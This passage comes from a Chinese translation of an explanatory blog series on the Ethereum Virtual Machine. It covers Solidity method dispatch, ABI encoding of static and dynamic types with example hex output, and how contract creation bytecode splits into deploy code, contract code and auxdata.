class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">methodSelector <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">0</span>:4<span class="token punctuation">]</span><span class="token keyword">if</span> methodSelector <span class="token operator">==</span> <span class="token string">"0xee919d50"</span><span class="token builtin class-name">:</span>  goto tag_2 // goto setAelse:  // No matching method. Fail.  revert@returnTo <span class="token operator">=</span> tag_3tag_2: // setA<span class="token punctuation">(</span>uint256 _a<span class="token punctuation">)</span>  @arg1 <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">4</span>:36<span class="token punctuation">]</span>tag_4: // a <span class="token operator">=</span> _a  sstore<span class="token punctuation">(</span>0x0, @arg1<span class="token punctuation">)</span>tag_5 // <span class="token builtin class-name">return</span>  jump<span class="token punctuation">(</span>@returnTo<span class="token punctuation">)</span>tag_3:  stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Solidity 编译器如何为具有多种方法的合约生成汇编代码？使用更多的 <code>if-else</code> 分支就可以了。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">methodSelector <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">0</span>:4<span class="token punctuation">]</span><span class="token keyword">if</span> methodSelector <span class="token operator">==</span> <span class="token string">"0x9cdcf9b"</span><span class="token builtin class-name">:</span>  goto tag_2elsif methodSelector <span class="token operator">==</span> <span class="token string">"0xee919d50"</span><span class="token builtin class-name">:</span>  goto tag_3else:  // Cannot <span class="token function">find</span> a matching method. Fail.  revert<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p> <a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI">ABI 编码规范</a> 详细说明了如何对更复杂类型的参数进行编码，但阅读起来可能会非常痛苦。学习 ABI 编码的另一个策略是使用 <a href="https://github.com/ethereum/pyethereum/blob/4e945e2a24554ec04eccb160cff689a82eed7e0d/ethereum/abi.py">pyethereum 的 ABI 编码函数</a> 来研究不同类型的数据是如何编码的。</p><p>首先导入 <code>encode_abi</code> 函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ethereum<span class="token punctuation">.</span>abi <span class="token keyword">import</span> encode_abi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>对于有不同类型参数的方法，查看其对应的编码参数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"int8"</span>, <span class="token string">"uint32"</span>, <span class="token string">"uint64"</span><span class="token punctuation">]</span>,<span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003<span class="token operator">></span> encode_abi<span class="token punctuation">(</span>   <span class="token punctuation">[</span><span class="token string">"int8[3]"</span>, <span class="token string">"int256[3]"</span><span class="token punctuation">]</span>,   <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">4</span>, <span class="token number">5</span>, <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>// int8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>. Zero-padded to <span class="token number">32</span> bytes.000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003// int256<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>.000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>对于动态数组，ABI 引入了一个间接层(layer of indirection)来编码动态数组，遵循称为 <a href="https://github.com/ethereum/pyethereum/blob/4e945e2a24554ec04eccb160cff689a82eed7e0d/ethereum/abi.py#L735-L741">头尾编码(head-tail encoding)</a> 的方案。思想是动态数组的元素被打包在交易 calldata 的尾部。参数(“head”)是对数组元素所在的 calldata 的引用，指向尾部包含的三个动态数组的实际数据。示例如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"uint256[]"</span>, <span class="token string">"uint256[]"</span>, <span class="token string">"uint256[]"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token punctuation">[</span>0xa1, 0xa2, 0xa3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xb1, 0xb2, 0xb3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xc1, 0xc2, 0xc3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>/************* HEAD <span class="token punctuation">(</span><span class="token number">32</span>*3 bytes<span class="token punctuation">)</span> *************/// arg1: <span class="token function">look</span> at position 0x60 <span class="token keyword">for</span> array data0000000000000000000000000000000000000000000000000000000000000060// arg2: <span class="token function">look</span> at position 0xe0 <span class="token keyword">for</span> array data00000000000000000000000000000000000000000000000000000000000000e0// arg3: <span class="token function">look</span> at position 0x160 <span class="token keyword">for</span> array data0000000000000000000000000000000000000000000000000000000000000160/************* TAIL <span class="token punctuation">(</span><span class="token number">128</span>**3 bytes<span class="token punctuation">)</span> *************/// position 0x60. Data <span class="token keyword">for</span> arg1.// Length followed by elements.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000a100000000000000000000000000000000000000000000000000000000000000a200000000000000000000000000000000000000000000000000000000000000a3// position 0xe0. Data <span class="token keyword">for</span> arg2.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3// position 0x160. Data <span class="token keyword">for</span> arg3.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000c100000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>可以混合使用动态和静态参数，两种参数会分别按照上述的两种方法进行编码。例如：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"uint256"</span>, <span class="token string">"uint256[]"</span>, <span class="token string">"uint256"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span>0xaaaa, <span class="token punctuation">[</span>0xb1, 0xb2, 0xb3<span class="token punctuation">]</span>, 0xbbbb<span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>/************* HEAD <span class="token punctuation">(</span><span class="token number">32</span>*3 bytes<span class="token punctuation">)</span> *************/// arg1: 0xaaaa000000000000000000000000000000000000000000000000000000000000aaaa// arg2: <span class="token function">look</span> at position 0x60 <span class="token keyword">for</span> array data0000000000000000000000000000000000000000000000000000000000000060// arg3: 0xbbbb000000000000000000000000000000000000000000000000000000000000bbbb/************* TAIL <span class="token punctuation">(</span><span class="token number">128</span> bytes<span class="token punctuation">)</span> *************/// position 0x60. Data <span class="token keyword">for</span> arg2.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>字符串和字节数组也是头尾编码的。唯一的区别是字节被紧密地打包成 32 个字节的块。对于每个字符串&#x2F;字节数组，前 32 个字节编码了长度，紧跟着是字节。如果字符串大于 32 字节，则使用多个 32 字节块。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"string"</span>, <span class="token string">"string"</span>, <span class="token string">"string"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token string">"aaaa"</span>, <span class="token string">"bbbb"</span>, <span class="token string">"cccc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>// arg1: <span class="token function">look</span> at position 0x60 <span class="token keyword">for</span> string data0000000000000000000000000000000000000000000000000000000000000060// arg2: <span class="token function">look</span> at position 0xa0 <span class="token keyword">for</span> string data00000000000000000000000000000000000000000000000000000000000000a0// arg3: <span class="token function">look</span> at position 0xe0 <span class="token keyword">for</span> string data00000000000000000000000000000000000000000000000000000000000000e0// 0x60 <span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span>. Data <span class="token keyword">for</span> arg10000000000000000000000000000000000000000000000000000000000000004<span class="token number">6161616100000000000000000000000000000000000000000000000000000000</span>// 0xa0 <span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">)</span>. Data <span class="token keyword">for</span> arg20000000000000000000000000000000000000000000000000000000000000004<span class="token number">6262626200000000000000000000000000000000000000000000000000000000</span>// 0xe0 <span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span>. Data <span class="token keyword">for</span> arg30000000000000000000000000000000000000000000000000000000000000004<span class="token number">6363636300000000000000000000000000000000000000000000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>嵌套数组的每个嵌套都有一个间接寻址。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"uint256[][]"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>0xa1, 0xa2, 0xa3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xb1, 0xb2, 0xb3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xc1, 0xc2, 0xc3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>// arg1: The outter array is at position 0x20.0000000000000000000000000000000000000000000000000000000000000020// 0x20. Each element is the position of an inner array.0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000160// array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> at 0x60000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000a100000000000000000000000000000000000000000000000000000000000000a200000000000000000000000000000000000000000000000000000000000000a3// array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> at 0xe0000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3// array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> at 0x160000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000c100000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>交易中的每个零字节数据或代码需要支付 4 gas，而每个非零字节数据或代码需要支付 68，因此使用零填充并不像看起来那么糟。同时应该注意到，对于有符号整数的负值来说，填充该值会使用 <code>1</code>，这会花费非常多的 gas。</p><h2 id="5-智能合约创建过程"><a href="#5-智能合约创建过程" class="headerlink" title="5. 智能合约创建过程"></a>5. 智能合约创建过程</h2><p>将合约编译后的字节码放在交易的 <code>data</code> 字段， <code>to</code> 字段留空，设置合适的 gas limit 和 gas price 后，发送这样的交易就可以创建一个合约。没有特殊的 RPC 调用或交易类型来创建合约。 在处理此交易时，EVM 会将输入数据作为代码执行，然后合约就诞生了。</p><p>对于一个简单合约（此处仍使用 0.4.11 版本编译器的编译结果进行分析，与 0.8.17 版本的编译结果稍有差异）：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>0.4.11 版本编译器编译后的字节码是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">60606040523415600e57600080fd5b5b603680601c6000396000f30060606040525b600080fd00a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>字节码可分为三个部分：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 部署代码 <span class="token punctuation">(</span>Deploy code<span class="token punctuation">)</span>: 60606040523415600e57600080fd5b5b603680601c6000396000f300// 合约代码 <span class="token punctuation">(</span>Contract code<span class="token punctuation">)</span>60606040525b600080fd00// 辅助数据 <span class="token punctuation">(</span>Auxdata<span class="token punctuation">)</span>a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>部署代码在创建合约时运行。</li><li>合约代码在合约创建后其方法被调用时运行。</li><li>（可选）辅助数据是源代码的加密指纹，用于验证。只是数据，从未由 EVM 执行。</li></ul><p>部署代码负责：1）运行构造函数，并设置初始存储变量，2）计算合约代码，并将其返回给 EVM。第 2 部分中，部署代码将字节码 <code>60606040525b600080fd00</code> 加载到内存中，然后将其作为合约代码返回。</p><p>在部署代码运行并返回合约代码之后会发生什么？详细过程可以查看 Go-Ethereum 的方法实现  <a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@e9295163aa25479e817efee4aac23eaeb7554bba/-/blob/core/vm/evm.go#L301">evm.Create</a>。总的来说，该方法会执行如下过程：</p><ol><li>检查调用者是否有足够的余额进行转账；</li><li>从调用者的地址生成(derive)新合约的地址（使用调用者的地址和 <code>nonce</code>）；</li><li>使用生成的合约地址创建新的合约账户（更改“世界状态(word state)” StateDB）；</li><li>将初始 Ether 捐赠(endowment)从调用者转移到新合约；</li><li>将输入数据设置为合约的部署代码，然后使用 EVM 执行；</li><li>检查错误。如果合约代码太大，则失败；否则收取用户 gas，并设置合约代码。</li></ol><p>上面部署代码对应的汇编是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Reserve 0x60 bytes of memory <span class="token keyword">for</span> Solidity internal uses.mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>// Non-payable contract. Revert <span class="token keyword">if</span> <span class="token builtin class-name">caller</span> sent ether.jumpi<span class="token punctuation">(</span>tag_1, iszero<span class="token punctuation">(</span>callvalue<span class="token punctuation">))</span>0x0dup1revert// Copy contract code into memory, and return.tag_1:tag_2:  dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  dup1  dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  0x0  codecopy  0x0  <span class="token builtin class-name">return</span>stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>跟踪执行上述部署汇编以返回合约代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// <span class="token number">60</span> <span class="token number">36</span> <span class="token punctuation">(</span>PUSH 0x36<span class="token punctuation">)</span>dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  stack: <span class="token punctuation">[</span>0x36<span class="token punctuation">]</span>dup1  stack: <span class="token punctuation">[</span>0x36 0x36<span class="token punctuation">]</span>// <span class="token number">60</span> 1c <span class="token operator">==</span> <span class="token punctuation">(</span>PUSH 0x1c<span class="token punctuation">)</span>dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  stack: <span class="token punctuation">[</span>0x1c 0x36 0x36<span class="token punctuation">]</span>0x0  stack: <span class="token punctuation">[</span>0x0 0x1c 0x36 0x36<span class="token punctuation">]</span>codecopy  // Consumes <span class="token number">3</span> arguments  // Copy <span class="token variable"><span class="token variable">`</span>length<span class="token variable">`</span></span> of data from <span class="token variable"><span class="token variable">`</span>codeOffset<span class="token variable">`</span></span> to <span class="token variable"><span class="token variable">`</span>memoryOffset<span class="token variable">`</span></span>  // memoryOffset <span class="token operator">=</span> 0x0  // codeOffset   <span class="token operator">=</span> 0x1c  // length       <span class="token operator">=</span> 0x36  stack: <span class="token punctuation">[</span>0x36<span class="token punctuation">]</span>0x0  stack: <span class="token punctuation">[</span>0x0 0x36<span class="token punctuation">]</span>  memory: <span class="token punctuation">[</span>    0x0:0x36 <span class="token operator">=</span><span class="token operator">></span> calldata<span class="token punctuation">[</span>0x1c:0x36<span class="token punctuation">]</span>  <span class="token punctuation">]</span><span class="token builtin class-name">return</span>  // Consumes <span class="token number">2</span> arguments  // Return <span class="token variable"><span class="token variable">`</span>length<span class="token variable">`</span></span> of data from <span class="token variable"><span class="token variable">`</span>memoryOffset<span class="token variable">`</span></span>  // memoryOffset  <span class="token operator">=</span> 0x0  // length        <span class="token operator">=</span> 0x36  stack: <span class="token punctuation">[</span><span class="token punctuation">]</span>  memory: <span class="token punctuation">[</span>    0x0:0x36 <span class="token operator">=</span><span class="token operator">></span> calldata<span class="token punctuation">[</span>0x1c:0x36<span class="token punctuation">]</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>dataSize(sub_0)</code> 和 <code>dataOffset(sub_0)</code> 不是真正的指令。它们实际上是将常量放入堆栈的 PUSH 指令。<code>codecopy</code> 指令可以将交易的输入数据复制到内存。两个常量 <code>0x1C</code> (28) 和 <code>0x36</code> (54) 指定一个字节码子串作为合约代码返回。</p><p>部署代码汇编做的事情大致对应如下的 Python3 代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">memory <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>calldata <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"60606040523415600e57600080fd5b5b603680601c6000396000f30060606040525b600080fd00a165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029"</span><span class="token punctuation">)</span>size <span class="token operator">=</span> <span class="token number">0x36</span>   <span class="token operator">//</span> dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">0x1c</span> <span class="token operator">//</span> dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span><span class="token operator">//</span> Copy substring of calldata to memorymemory<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> calldata<span class="token punctuation">[</span>offset<span class="token punctuation">:</span>offset<span class="token operator">+</span>size<span class="token punctuation">]</span><span class="token operator">//</span> Instead of <span class="token keyword">return</span><span class="token punctuation">,</span> <span class="token keyword">print</span> the memory content <span class="token keyword">in</span> <span class="token builtin">hex</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>memory<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>部署代码执行结束后，结果内存内容是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">60606040525b600080fd00a165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>此时内存中的内容对应于合约代码和辅助数据：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sub_0: assembly <span class="token punctuation">&#123;</span>        /* <span class="token string">"c.sol"</span>:28:43  contract C <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>. */      mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>      0x00      dup1      revert    auxdata: 0xa165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>上面以 <code>sub_0</code> 为标签的汇编代码对应于字节码 <code>60606040525b600080fd00</code>，正是合约代码本身。从区块链浏览器也可以看到部署的合约代码的内容：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUSH1 0x60PUSH1 0x40MSTOREJUMPDESTPUSH1 0x00DUP1REVERTSTOP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>除了返回合约代码之外，部署代码的另一个目的是运行构造函数进行设置。如果有构造函数参数，部署代码需要以某种方式从某个地方加载参数数据。Solidity 约定在交易的字节码末尾附加 ABI 编码的参数值，以传递构造函数的参数（<code>&quot;data&quot;: hexencode(compiledByteCode + encodedParams)</code>）。 比如下面的构造函数带有参数的合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>使用值 <code>66</code> 创建合约时，交易的 <code>calldata</code> 数据为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x6080604052348015600f57600080fd5b5060405160e338038060e38339818101604052810190602d9190604c565b80600081905550506097565b6000815190506046816083565b92915050565b600060208284031215605f57605e607e565b5b6000606b848285016039565b91505092915050565b6000819050919050565b600080fd5b608a816074565b8114609457600080fd5b50565b603f8060a46000396000f3fe6080604052600080fdfea26469706673582212203f18e0d6b17cc4774d87b4703a0c9b647f0760cc4819f0fcecd0107747005bac64736f6c634300080700330000000000000000000000000000000000000000000000000000000000000042<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>字段数据中，最后是编码为 32 字节的数字。</p><p>为了处理构造函数中的参数，部署代码将 ABI 参数从 <code>calldata</code> 的末尾复制到内存中，然后从内存复制到堆栈中。</p><h3 id="创建合约的合约"><a href="#创建合约的合约" class="headerlink" title="创建合约的合约"></a>创建合约的合约</h3><p><code>FooFactory</code> 合约可以通过调用 <code>makeNewFoo</code> 创建新的 <code>Foo</code> 实例：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Foo</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">FooFactory</span> <span class="token punctuation">&#123;</span><span class="token builtin">address</span> fooInstance<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">makeNewFoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fooInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约的完整汇编在 <a href="https://gist.github.com/hayeah/a94aa4e87b7b42e9003adf64806c84e4">This Gist</a> 中。编译器输出的结构比较复杂，它是这样组织的：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FooFactoryDeployCodeFooFactoryContractCodeFooDeployCodeFooContractCodeFooAUXDataFooFactoryAUXData<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>FooFactoryContractCode</code> 基本上是复制 <code>tag_8</code> 中 <code>Foo</code> 的字节码，然后跳转回 <code>tag_7</code> 以执行 <code>create</code> 指令。<code>create</code> 指令类似于发送交易的 RPC 调用，提供了一种在 EVM 内创建新合约的方法。有关 go-ethereum 源代码，请参见 <a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@e9295163aa25479e817efee4aac23eaeb7554bba/-/blob/core/vm/instructions.go#L572:6">opCreate</a>。该指令调用 <code>evm.Create</code> 来创建一个合约。</p><p>辅助数据 <code>auxdata</code> 是一个哈希值，可以用它来获取有关已部署合约的元数据，其格式为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0xa1 0x65 <span class="token string">'b'</span> <span class="token string">'z'</span> <span class="token string">'z'</span> <span class="token string">'r'</span> <span class="token string">'0'</span> 0x58 0x20 <span class="token operator">&lt;</span><span class="token number">32</span> bytes swarm hash<span class="token operator">></span> 0x00 0x29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>总的来说，合约被创建的方式类似于自解压软件安装程序的工作方式。当安装程序运行时，会配置系统环境，然后通过读取其程序包将目标程序提取到系统中。这对应于 <code>calldata</code> 中的部署代码和合约代码。智能合约可以使用和交易相同的过程来创建其他智能合约。构造函数如果有参数的话会将用于部署合约的参数放在字节码的最后。<code>data</code> 的字节码分布像这样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"data"</span><span class="token operator">:</span> constructorCode + contractCode + auxdata + constructorData<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>‍在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 